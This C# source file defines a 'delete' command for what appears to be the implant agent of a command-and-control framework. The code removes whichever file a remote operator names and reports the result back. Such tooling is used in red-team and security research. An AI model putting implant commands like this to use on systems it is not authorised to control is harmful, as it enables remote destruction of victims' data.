using System;
using System.IO;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Delete : EngineerCommand
    {
        public override string Name => "delete";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                if (!task.Arguments.TryGetValue("/file", out string file))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "no file to delete set pls use the /file key", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                //delete file
                File.Delete(file);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Deleted {file}", task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
